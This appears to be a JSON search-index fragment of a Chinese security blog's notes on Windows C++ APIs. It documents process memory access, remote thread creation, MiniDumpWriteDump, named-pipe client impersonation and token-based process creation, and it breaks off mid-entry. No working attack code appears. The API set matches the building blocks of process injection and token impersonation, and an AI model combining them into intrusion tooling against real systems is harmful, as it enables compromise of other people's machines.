\u4ecedll\u6587\u4ef6\u53e5\u67c4\u4e2d\u83b7\u5f97\u51fd\u6570\uff1aGetProcAddress \u83b7\u5f97\u4e00\u4e2a\u5df2\u5b58\u5728\u6587\u4ef6\u53e5\u67c4\u6216\u8005\u65b0\u5efa\u6587\u4ef6\u53e5\u67c4:CreateFile \u5199\u6587\u4ef6: ReadFile \u8bfb\u6587\u4ef6: ReadFile \u670d\u52a1 \u5efa\u7acb\u4e0e\u6307\u5b9a\u8ba1\u7b97\u673a\u670d\u52a1\u63a7\u5236\u7ba1\u7406\u5668\u7684\u8054\u7edc\u5e76\u6253\u5f00\u5176\u6570\u636e\u5e93: OpenSCManagerA \u521b\u5efa\u4e00\u4e2a\u670d\u52a1\u5e76\u628a\u5b83\u52a0\u5165\u5230\u670d\u52a1\u7ba1\u7406\u5668\u6570\u636e\u5e93\uff1a CreateServiceA \u6253\u5f00\u4e00\u4e2a\u670d\u52a1\u5e76\u83b7\u5f97\u53e5\u67c4: OpenServiceA \u5411\u4e00\u4e2a\u670d\u52a1\u53d1\u9001\u63a7\u5236\u6307\u4ee4:ControlService \u4f7f\u670d\u52a1\u4e0eSCM\u94fe\u63a5\uff1a StartServiceCtrlDispatcherA \u6ce8\u518c\u4e00\u4e2a\u51fd\u6570\u6765\u5904\u7406\u670d\u52a1\u63a7\u5236\u8bf7\u6c42: RegisterServiceCtrlHandlerA \u66f4\u65b0\u670d\u52a1\u7684\u72b6\u6001\u4fe1\u606f: SetServiceStatus \u5feb\u7167 \u4ee5\u4e0b\u51fd\u6570\u6216\u7ed3\u6784\u57fa\u672c\u4e0a\u90fd\u7528\u5230\u4e86\u53e6\u4e00\u4e2a\u5934\u6587\u4ef6Tlhelp32.h \u4e3a\u8fdb\u7a0b\u521b\u5efa\u5feb\u7167\u6587\u4ef6(\u8f6c\u50a8): CreateToolhelp32Snapshot \u68c0\u7d22\u5feb\u7167\u4e2d\u9047\u5230\u7684\u7b2c\u4e00\u4e2a\u8fdb\u7a0b\u7684\u4fe1\u606f\uff1a Process32First \u68c0\u7d22\u5feb\u7167\u4e2d\u4e0b\u4e00\u4e2a\u8fdb\u7a0b\u7684\u4fe1\u606f: Process32Next \u5c06\u67d0\u4e2a\u8fdb\u7a0b\u8f6c\u50a8\u4e3a\u5feb\u7167\u5199\u5165\u6587\u4ef6: MiniDumpWriteDump HTTP\u8bf7\u6c42\uff0c\u591a\u6570\u51fd\u6570\u5305\u542b\u5728winhttp.h\u4e2d winhttpopen:\u8fd4\u56de WinHTTP-session \u53e5\u67c4 WinHttpConnect \uff1a\u8fd4\u56de \u94fe\u63a5 \u53e5\u67c4\uff08 handle to an HTTP session for that initial target. \uff09 WinHttpOpenRequest \uff1a\u521b\u5efaHTTP\u8bf7\u6c42\u53e5\u67c4 WinHttpAddRequestHeaders \u8bbe\u7f6eHTTP\u5934 WinHttpSendRequest \u53d1\u9001HTTP\u8bf7\u6c42 WinHttpReceiveResponse \uff1a\u7b49\u5f85http\u56de\u5e94 WinHttpQueryDataAvailable \uff1a\u8fd4\u56deHTTP\u56de\u5e94\u5185\u5bb9\u7684\u5927\u81f4\u4fe1\u606f WinHttpReadData \u8bfb\u53d6HTTP\u56de\u5e94\u5185\u5bb9 COM\u76f8\u5173 CoInitializeEx \uff1a\u521b\u5efaCOM\u73af\u5883 \u4e00\u4e9b\u6570\u636e\u7c7b\u578b NTSTATUS HRESULT title: \u8bb0\u5f55\u4e00\u4e0b\u7528\u8fc7\u7684c++ windows api date: tags: windows\u76f8\u5173","title":"\u76ee\u5f55"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/%E7%94%A8%E8%BF%87%E7%9A%84WINDOWS_API%E8%AE%B0%E5%BD%95/%E7%94%A8%E8%BF%87%E7%9A%84WINDOWS_API%E8%AE%B0%E5%BD%95/#apiapi","text":"","title":"API:\u6536\u5f55\u4e00\u4e0b\u8c03\u8fc7\u7684API"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/%E7%94%A8%E8%BF%87%E7%9A%84WINDOWS_API%E8%AE%B0%E5%BD%95/%E7%94%A8%E8%BF%87%E7%9A%84WINDOWS_API%E8%AE%B0%E5%BD%95/#_2","text":"","title":"\u8fdb\u7a0b\u4e0e\u5185\u5b58"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/%E7%94%A8%E8%BF%87%E7%9A%84WINDOWS_API%E8%AE%B0%E5%BD%95/%E7%94%A8%E8%BF%87%E7%9A%84WINDOWS_API%E8%AE%B0%E5%BD%95/#openprocess","text":"HANDLE OpenProcess( DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId ); dwdesiredaccess \u6307\u5b9a\u80fd\u83b7\u5f97\u6307\u5b9a\u8fdb\u7a0b\u54ea\u4e9b\u6743\u9650\u3002\u53ef\u9009\u503c\u5982\u4e0b PROCESS_ALL_ACCESS //\u6240\u6709\u80fd\u83b7\u5f97\u7684\u6743\u9650 PROCESS_CREATE_PROCESS //\u9700\u8981\u521b\u5efa\u4e00\u4e2a\u8fdb\u7a0b PROCESS_CREATE_THREAD //\u9700\u8981\u521b\u5efa\u4e00\u4e2a\u7ebf\u7a0b PROCESS_DUP_HANDLE //\u91cd\u590d\u4f7f\u7528DuplicateHandle\u53e5\u67c4 PROCESS_QUERY_INFORMATION //\u83b7\u5f97\u8fdb\u7a0b\u4fe1\u606f\u7684\u6743\u9650\uff0c\u5982\u5b83\u7684\u9000\u51fa\u4ee3\u7801\u3001\u4f18\u5148\u7ea7 PROCESS_QUERY_LIMITED_INFORMATION /*\u83b7\u5f97\u67d0\u4e9b\u4fe1\u606f\u7684\u6743\u9650\uff0c\u5982\u679c\u83b7\u5f97\u4e86PROCESS_QUERY_INFORMATION\uff0c\u4e5f\u62e5\u6709PROCESS_QUERY_LIMITED_INFORMATION\u6743\u9650*/ PROCESS_SET_INFORMATION //\u8bbe\u7f6e\u67d0\u4e9b\u4fe1\u606f\u7684\u6743\u9650\uff0c\u5982\u8fdb\u7a0b\u4f18\u5148\u7ea7 PROCESS_SET_QUOTA //\u8bbe\u7f6e\u5185\u5b58\u9650\u5236\u7684\u6743\u9650\uff0c\u4f7f\u7528SetProcessWorkingSetSize PROCESS_SUSPEND_RESUME //\u6682\u505c\u6216\u6062\u590d\u8fdb\u7a0b\u7684\u6743\u9650 PROCESS_TERMINATE //\u7ec8\u6b62\u4e00\u4e2a\u8fdb\u7a0b\u7684\u6743\u9650\uff0c\u4f7f\u7528TerminateProcess PROCESS_VM_OPERATION //\u64cd\u4f5c\u8fdb\u7a0b\u5185\u5b58\u7a7a\u95f4\u7684\u6743\u9650(\u53ef\u7528VirtualProtectEx\u548cWriteProcessMemory) PROCESS_VM_READ //\u8bfb\u53d6\u8fdb\u7a0b\u5185\u5b58\u7a7a\u95f4\u7684\u6743\u9650\uff0c\u53ef\u4f7f\u7528ReadProcessMemory PROCESS_VM_WRITE //\u8bfb\u53d6\u8fdb\u7a0b\u5185\u5b58\u7a7a\u95f4\u7684\u6743\u9650\uff0c\u53ef\u4f7f\u7528WriteProcessMemory SYNCHRONIZE //\u7b49\u5f85\u8fdb\u7a0b\u7ec8\u6b62 bInheritHandle \u82e5\u4e3aTRUE\uff0c\u5219\u8868\u793a\u6240\u5f97\u5230\u7684\u8fdb\u7a0b\u53e5\u67c4\u53ef\u88ab\u7ee7\u627f dwProcessId \u8868\u793a\u8981\u83b7\u53d6\u7684\u8fdb\u7a0b\u7684PID \u51fd\u6570\u6210\u529f\u6267\u884c\uff0c\u5219\u8fd4\u56de\u6307\u5b9a\u8fdb\u7a0b\u7684\u53e5\u67c4\u3002\u53cd\u4e4b\u5219NULL\u3002","title":"\u6253\u5f00\u4e00\u4e2a\u5df2\u5b58\u5728\u7684\u672c\u5730\u8fdb\u7a0b:OpenProcess"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/%E7%94%A8%E8%BF%87%E7%9A%84WINDOWS_API%E8%AE%B0%E5%BD%95/%E7%94%A8%E8%BF%87%E7%9A%84WINDOWS_API%E8%AE%B0%E5%BD%95/#virtualallocex","text":"LPVOID VirtualAllocEx( HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect ); hProcess \u6307\u5b9a\u7684\u8fdb\u7a0b\u7684\u53e5\u67c4\u3002\u8be5\u53e5\u67c4\u9700\u6709 PROCESS_VM_OPERATION \u6743\u9650\uff08\u64cd\u4f5c\u8fdb\u7a0b\u5185\u5b58\u7a7a\u95f4\u7684\u6743\u9650\uff09 lpAddress \u4e00\u4e2a\u6307\u9488\uff0c\u7528\u4e8e\u9009\u62e9\u4f60\u60f3\u5206\u914d\u7684\u5185\u5b58\u7684\u5f00\u59cb\u5730\u5740\u3002\u5982\u679c\u586bNULL\uff0c\u5219\u7531dwsize\u7684\u8bbe\u7f6e\u6765\u81ea\u52a8\u5206\u914d\u3002 dwSize \u6b32\u5206\u914d\u7684\u5185\u5b58\u5927\u5c0f\uff08\u5b57\u8282\u5355\u4f4d\uff09\u3002\u5b9e\u9645\u5206\u914d\u7684\u5927\u5c0f\u662f\u8be5\u503c\u4e0e\u9875\u5185\u5b58\u5bf9\u9f50\u540e\u7684\u7ed3\u679c\u3002\u5982\u679clpAddress\u4e3aNULL\uff0c\u5219\u4f1a\u9009\u4e2d\u4ece\u8fdb\u7a0b\u9996\u5730\u5740\u5230dwSize\u7684\u9875\u5bf9\u9f50\u540e\u7684\u5185\u5b58\u533a\u57df \u5982\u679clpAddress\u4e0d\u4e3aNULL\uff0c\u5219\u9009\u5b9alpaddress\u5230lpaddress+dwsize\u7684\u6309\u7167\u9875\u5bf9\u9f50\u540e\u7684\u5185\u5b58\u533a\u57df\u3002 flAllocationType \u5185\u5b58\u5206\u914d\u7684\u7c7b\u578b\u3002\u6709\u5f88\u591a\u503c\uff0cMSDN\u4e0a\u6709\u8bb0\u5f55\u3002 https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex \u8fd9\u4e2a\u503c\u7528\u6765\u786e\u5b9a\u4e00\u6bb5\u5185\u5b58\u533a\u57df\u7528\u4e8e\u88ab\u7f6e0(commit)\u8fd8\u662f\u4fdd\u7559(reserve)\u8fd8\u662f\u7981\u7528(reset) flProtect \u5185\u5b58\u4fdd\u62a4\u5e38\u6570 PAGE_NOACCESS PAGE_GUARD PAGE_NOCACHE PAGE_WRITECOMBINE \u82e5\u51fd\u6570\u6267\u884c\u6210\u529f\uff0c\u5219\u8fd4\u56de\u5206\u914d\u7684\u5185\u5b58\u5730\u5740\u7684\u57fa\u5730\u5740\u3002","title":"\u5728\u6307\u5b9a\u8fdb\u7a0b\u7684\u865a\u62df\u5730\u5740\u7a7a\u95f4\u4e2d\u4fdd\u7559\uff0c\u5f00\u8f9f\uff0c\u7981\u7528\u4e00\u6bb5\u533a\u57df : VirtualAllocEx"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/%E7%94%A8%E8%BF%87%E7%9A%84WINDOWS_API%E8%AE%B0%E5%BD%95/%E7%94%A8%E8%BF%87%E7%9A%84WINDOWS_API%E8%AE%B0%E5%BD%95/#decommit-virtualfreeex","text":"BOOL VirtualFreeEx( HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType ); hprocess \u8fdb\u7a0b\u53e5\u67c4\uff0c\u9700\u6709 PROCESS_VM_OPERATION \u6743\u9650 lpaddress \u4e00\u4e2a\u6307\u5411\u9700\u8981\u88ab\u91ca\u653e\u6216decommit\u5185\u5b58\u533a\u57df\u9996\u5730\u5740\u7684\u6307\u9488\u3002\u82e5dwfreetype\u4e3amem_release(\u91ca\u653e),\u5219\u8fd9\u91cc\u5e94\u8be5\u586b\u5165VirtualAllocEx\u65b9\u6cd5\u8fd4\u56de\u7684\u4fdd\u7559\u7684\u5185\u5b58\u533a\u57df\u7684\u57fa\u5730\u5740\u3002 dwsize \u9700\u8981\u88abdecommit\u7684\u5185\u5b58\u5927\u5c0f\u3002 \u82e5dwfreetype\u4e3aMEM_RELEASE \u5219\u6b64\u5904\u586b0 \u82e5\u4e3aMEM_DECOMMIT\uff0c\u5219\u6b64\u5904\u586b\u5185\u5b58\u5927\u5c0f\u3002 \u9009\u5b9alpaddress\u5230lpaddress+dwsize\u7684\u6309\u7167\u9875\u5bf9\u9f50\u540e\u7684\u5185\u5b58\u533a\u57df\u3002 dwfreetype \u9700\u8981\u5bf9\u5185\u5b58\u533a\u57df\u8fdb\u884c\u7684\u64cd\u4f5c\u3002\u6709MEM_DECOMMIT\u548cMEM_RELEASE\uff0c\u66f4\u591a\u53c2\u6570\u53c2\u8003MSDNhttps\\://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualfreeex \u82e5\u51fd\u6570\u6267\u884c\u6210\u529f\u5219\u8fd4\u56de\u4e00\u4e2a\u975e\u96f6\u503c\uff0c\u4e0d\u6210\u529f\u5219\u8fd4\u56de0","title":"\u5728\u6307\u5b9a\u8fdb\u7a0b\u7684\u865a\u62df\u5730\u5740\u7a7a\u95f4\u4e2d\u91ca\u653e\u6216decommit\u4e00\u6bb5\u533a\u57df : VirtualFreeEx"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/%E7%94%A8%E8%BF%87%E7%9A%84WINDOWS_API%E8%AE%B0%E5%BD%95/%E7%94%A8%E8%BF%87%E7%9A%84WINDOWS_API%E8%AE%B0%E5%BD%95/#writeprocessmemory","text":"BOOL WriteProcessMemory( HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten ); hprocess \u8fdb\u7a0b\u53e5\u67c4 lpbaseaddress \u9700\u8981\u5199\u5165\u7684\u5185\u5b58\u533a\u57df\u7684\u8d77\u59cb\u5730\u5740\u6307\u9488 lpbuffer \u6307\u5411\u7f13\u51b2\u533a\u7684\u6307\u9488\uff0c\u8be5\u7f13\u51b2\u533a\u5305\u542b\u8981\u5728\u6307\u5b9a\u8fdb\u7a0b\u7684\u5730\u5740\u7a7a\u95f4\u4e2d\u5199\u5165\u7684\u6570\u636e\u3002 nsize \u9700\u8981\u5199\u5165\u7684\u6570\u636e\u5927\u5c0f\uff08\u5b57\u8282\u5355\u4f4d\uff09 lpNumberOfBytesWritten \u53ef\u9009\uff0c\u7528\u6765\u5b58\u653e\u201d\u8981\u88ab\u5199\u5165\u7684\u6570\u636e\u201c\u7684\u53d8\u91cf \u82e5\u6210\u529f\u5219\u8fd4\u56de\u975e0\u503c\uff0c\u53cd\u4e4b\u52190","title":"\u5411\u6307\u5b9a\u8fdb\u7a0b\u7684\u5185\u5b58\u533a\u57df\u5199\u5165: WriteProcessMemory"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/%E7%94%A8%E8%BF%87%E7%9A%84WINDOWS_API%E8%AE%B0%E5%BD%95/%E7%94%A8%E8%BF%87%E7%9A%84WINDOWS_API%E8%AE%B0%E5%BD%95/#createremotethread","text":"HANDLE CreateRemoteThread( HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId ); hprocess \u8fdb\u7a0b\u53e5\u67c4 lpThreadAttributes \u5b89\u5168\u63cf\u8ff0\u7b26 dwStackSize \u6808\u5927\u5c0f\uff0c\u82e5\u4e3a0\u5219\u4e3a\u9ed8\u8ba4\u503c lpStartAddress \u8981\u521b\u5efa\u7684\u7ebf\u7a0b\u7684\u5b9e\u73b0\u51fd\u6570\u7684\u9996\u5730\u5740 lpParameter \u4f20\u9012\u7ed9\u7ebf\u7a0b\u51fd\u6570\u7684\u53c2\u6570 dwCreationFlags \u7ebf\u7a0b\u63a7\u5236\u53c2\u6570 0 The thread runs immediately after creation. \u200b CREATE_SUSPENDED 0x00000004 The thread is created in a suspended state, and does not run until the ResumeThread function is called. \u200b STACK_SIZE_PARAM_IS_A_RESERVATION 0x00010000 The ** dwStackSize parameter specifies the initial reserve size of the stack. If this flag is not specified, ** dwStackSize specifies the commit size. lpThreadId \u7ebf\u7a0b\u6807\u8bc6\u7b26\uff0c\u5982\u679c\u7ebf\u7a0b\u4e0d\u8fd4\u56de\u6807\u8bc6\u7b26\u5219\u6b64\u9879\u586bNULL","title":"\u5728\u4e00\u4e2a\u8fdb\u7a0b\u5185\u5b58\u7a7a\u95f4\u4e2d\u521b\u5efa\u4e00\u4e2a\u7ebf\u7a0b\uff1aCreateRemoteThread"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/%E7%94%A8%E8%BF%87%E7%9A%84WINDOWS_API%E8%AE%B0%E5%BD%95/%E7%94%A8%E8%BF%87%E7%9A%84WINDOWS_API%E8%AE%B0%E5%BD%95/#closehandle","text":"BOOL CloseHandle( HANDLE hObject ); hobject \u8981\u88ab\u5173\u95ed\u7684\u53e5\u67c4 \u6210\u529f\u5219\u8fd4\u56de\u975e0\u503c\uff0c\u53cd\u4e4b\u52190","title":"\u5173\u95ed\u4e00\u4e2a\u53e5\u67c4:CloseHandle"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/%E7%94%A8%E8%BF%87%E7%9A%84WINDOWS_API%E8%AE%B0%E5%BD%95/%E7%94%A8%E8%BF%87%E7%9A%84WINDOWS_API%E8%AE%B0%E5%BD%95/#rtlsecurezeromemory-0","text":"PVOID RtlSecureZeroMemory( PVOID ptr, SIZE_T cnt ); ptr \u6307\u5411\u5185\u5b58\u7684\u6307\u9488 cnt \u586b\u5145\u7684\u5b57\u8282\u6570","title":"RtlSecureZeroMemory \uff1a\u4ee5\u5b89\u5168\u65b9\u5f0f\u75280\u586b\u5145\u5185\u5b58"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/%E7%94%A8%E8%BF%87%E7%9A%84WINDOWS_API%E8%AE%B0%E5%BD%95/%E7%94%A8%E8%BF%87%E7%9A%84WINDOWS_API%E8%AE%B0%E5%BD%95/#_3","text":"","title":"\u4ee4\u724c\u4e0e\u547d\u540d\u7ba1\u9053"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/%E7%94%A8%E8%BF%87%E7%9A%84WINDOWS_API%E8%AE%B0%E5%BD%95/%E7%94%A8%E8%BF%87%E7%9A%84WINDOWS_API%E8%AE%B0%E5%BD%95/#createnamedpipea","text":"HANDLE CreateNamedPipeA( LPCSTR lpName, DWORD dwOpenMode, DWORD dwPipeMode, DWORD nMaxInstances, DWORD nOutBufferSize, DWORD nInBufferSize, DWORD nDefaultTimeOut, LPSECURITY_ATTRIBUTES lpSecurityAttributes ); lpName \u552f\u4e00\u7684\u7ba1\u9053\u540d\u3002\u683c\u5f0f\u662f\u56fa\u5b9a\u7684: \\.\\pipe*pipename* dwOpenMode \u7ba1\u9053\u7684\u5f00\u542f\u65b9\u5f0f\u3002\u6709\u4e09\u79cd\uff1a1.\u6570\u636e\u5728\u670d\u52a1\u5668\u548c\u5ba2\u6237\u673a\u53cc\u5411\u6d41\u901a PIPE_ACCESS_DUPLEX \u30022.\u6570\u636e\u53ea\u80fd\u4ece\u670d\u52a1\u5668\u6d41\u5411\u5ba2\u6237\u673a PIPE_ACCESS_OUTBOUND \u30023.\u6570\u636e\u53ea\u80fd\u4ece\u5ba2\u6237\u673a\u6d41\u5411\u670d\u52a1\u5668 PIPE_ACCESS_INBOUND \u3002\u5177\u4f53\u8bf7\u53c2\u8003\u5b98\u65b9\u6587\u6863\u3002\u4ee5\u53ca\u4e00\u4e9b\u9644\u52a0\u53c2\u6570\uff0c\u8be6\u60c5\u53c2\u8003\u5b98\u65b9\u6587\u6863 https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createnamedpipea dwPipeMode \u7ba1\u9053\u901a\u4fe1\u65b9\u5f0f\u3002\u6307\u5b9a\u5b57\u8282\u6d41\u6216\u8005\u6d88\u606f\u6d41\u901a\u4fe1\uff0c\u6307\u5b9a\u8fdc\u7a0b\u94fe\u63a5\u7684\u8bbf\u95ee\u65b9\u5f0f\uff0c\u6307\u5b9a\u7b49\u5f85\u65b9\u5f0f\uff0c\u8be6\u60c5\u53c2\u8003\u5b98\u65b9\u6587\u6863 nMaxInstancees \u7ba1\u9053\u7684\u6700\u5927\u5b9e\u4f8b\u6570 nOutBufferSize\\&nInBufferSize \u4e3a\u8f93\u51fa&\u8f93\u5165\u7f13\u5b58\u533a\u4fdd\u7559\u7684\u5185\u5b58\u5b57\u8282\u5927\u5c0f nDefaultTimeOut \u8bbe\u5b9a\u8d85\u65f6\u503c\u3002\u7f6e0\u5219\u4e3a50ms lpSecurityAttributes \u8bbe\u7f6e\u5b89\u5168\u63cf\u8ff0\u7b26 \u82e5\u51fd\u6570\u6267\u884c\u6210\u529f\u5219\u8fd4\u56de\u7ba1\u9053\u670d\u52a1\u5668\u53e5\u67c4\u3002\u53cd\u4e4b\u5219\u8fd4\u56de INVALID_HANDLE_VALUE","title":"\u521b\u5efa\u547d\u540d\u7ba1\u9053\u53e5\u67c4:CreateNamedPipeA"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/%E7%94%A8%E8%BF%87%E7%9A%84WINDOWS_API%E8%AE%B0%E5%BD%95/%E7%94%A8%E8%BF%87%E7%9A%84WINDOWS_API%E8%AE%B0%E5%BD%95/#connectnamedpipe","text":"BOOL ConnectNamedPipe( HANDLE hNamedPipe, LPOVERLAPPED lpOverlapped ); hNamedPipe \u6307\u5b9a\u4e00\u4e2a\u547d\u540d\u7ba1\u9053\u53e5\u67c4\uff0c\u8be5\u53e5\u67c4\u7531CreateNamedPipe\u51fd\u6570\u8fd4\u56de lpOverlapped \u4e00\u4e2a\u6307\u5411\u91cd\u53e0\u7ed3\u6784\u7684\u6307\u9488\uff0c\u4e00\u822c\u4e3aNULL\u3002\u8be6\u60c5\u53c2\u8003\u5b98\u65b9\u6587\u6863 https://docs.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-connectnamedpipe \u4e00\u822c\u6765\u8bf4\uff0c\u5f53\u7531\u5ba2\u6237\u673a\u8fde\u4e0a\u65f6\u8fd4\u56detrue\uff0c\u6ca1\u6709\u5ba2\u6237\u673a\u94fe\u63a5\u6216\u94fe\u63a5\u4e22\u5931\u8fd4\u56defalse","title":"\u5f00\u542f\u4e00\u4e2a\u547d\u540d\u7ba1\u9053\u7b49\u5f85\u94fe\u63a5: ConnectNamedPipe"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/%E7%94%A8%E8%BF%87%E7%9A%84WINDOWS_API%E8%AE%B0%E5%BD%95/%E7%94%A8%E8%BF%87%E7%9A%84WINDOWS_API%E8%AE%B0%E5%BD%95/#impersonatenamedpipeclient","text":"BOOL ImpersonateNamedPipeClient( HANDLE hNamedPipe ); hNamedPipe \u5373\u6307\u5b9a\u7684\u547d\u540d\u7ba1\u9053\u670d\u52a1\u7aef\u3002 \u8fd9\u4e2a\u51fd\u6570\u6709\u4e2a\u5751\u70b9\u662f\uff0c\u670d\u52a1\u7aef\u624d\u80fd\u7528\u8fd9\u4e2a\u51fd\u6570\uff0c\u4e14\u5fc5\u987b\u5728\u670d\u52a1\u7aef\u8bfb\u53d6\u5ba2\u6237\u7aef\u4f20\u6765\u7684\u6570\u636e\u540e\u624d\u80fd\u6210\u529f\uff0c\u5426\u5219\u5c31\u4f1a\u8fd4\u56de1368\u9519\u8bef\u3002","title":"\u6a21\u62df\u4e00\u4e2a\u547d\u540d\u7ba1\u9053\u5ba2\u6237\u7aef:ImpersonateNamedPipeClient"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/%E7%94%A8%E8%BF%87%E7%9A%84WINDOWS_API%E8%AE%B0%E5%BD%95/%E7%94%A8%E8%BF%87%E7%9A%84WINDOWS_API%E8%AE%B0%E5%BD%95/#getcurrentthreadtoken","text":"HANDLE GetCurrentThreadToken(); \u65e0\u53c2\u6570\uff0c\u76f4\u63a5\u8fd4\u56de\u5f53\u524d\u7ebf\u7a0b\u865a\u62df\u53e5\u67c4","title":"\u83b7\u53d6\u5f53\u524d\u7ebf\u7a0b\u4ee4\u724c\u53e5\u67c4: GetCurrentThreadToken"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/%E7%94%A8%E8%BF%87%E7%9A%84WINDOWS_API%E8%AE%B0%E5%BD%95/%E7%94%A8%E8%BF%87%E7%9A%84WINDOWS_API%E8%AE%B0%E5%BD%95/#1-createprocesswithtokenw","text":"BOOL CreateProcessWithTokenW( HANDLE hToken, DWORD dwLogonFlags, LPCWSTR lpApplicationName, LPWSTR lpCommandLine, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCWSTR lpCurrentDirectory, LPSTARTUPINFOW lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation ); \u6709\u70b9\u4e0d\u61c2\uff0c\u94fe\u63a5\u5728\u8fd9\u91cc https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw hToken \u8868\u793a\u7528\u6237\u7684\u4ee4\u724c \u5fc5\u987b\u6709 TOKEN_QUERY, TOKEN_DUPLICATE, and TOKEN_ASSIGN_PRIMARY \u6743\u9650 dwLogonFlags \u767b\u9646\u9009\u9879\u3002 LOGON_WITH_PROFILE \u6216 LOGON_NETCREDENTIALS_ONLY lpApplicationName \u8981\u88ab\u6267\u884c\u7684\u6a21\u5757\u3002\uff08\u6bd4\u5982 C:\\Windows\\system32\\notepad.exe ) lpCommandLine \u8981\u88ab\u6267\u884c\u7684\u547d\u4ee4\u3002\u5982\u679c\u4e3aNULL\u5219\u628a lpApplicationName \u5f53\u4f5c\u8981\u6267\u884c\u7684\u547d\u4ee4 dwCreationFlags \u63a7\u5236\u8fdb\u7a0b\u7684\u521b\u5efa\u65b9\u5f0f\u3002\u53c2\u8003MSDN lpEnvironment \u6307\u5411\u65b0\u8fdb\u7a0b\u73af\u5883\u5757\u7684\u6307\u9488\u3002 lpCurrentDirectory \u6307\u5411\u8fdb\u7a0b\u7684\u201c\u5f53\u524d\u76ee\u5f55\u201d\u8def\u5f84\u3002\u82e5NULL\u5219\u201c\u5f53\u524d\u76ee\u5f55\u201d\u4e3a\u8c03\u7528\u7a0b\u5e8f\u7684\u201c\u5f53\u524d\u76ee\u5f55\u201d lpStartUpInfo \u6307\u5411 STARTUPINFO \u6216 STARTUPINFOEX \u7ed3\u6784\u4f53 lpProcessInformation \u6307\u5411 PROCESS_INFORMATION \u7ed3\u679c\u7684\u6307\u9488 \u5751\u70b9\uff1a\u8c03\u7528\u8be5\u51fd\u6570\u7684\u8fdb\u7a0b\u5fc5\u987b\u6709 SE_IMPERSONATE_NAME \u6743\u9650\uff0c\u4e0d\u7136\u4f1a\u8fd4\u56deERROR:1314","title":"\u4ee5\u4ee4\u724c\u521b\u5efa\u4e00\u4e2a\u8fdb\u7a0b\uff081\uff09: 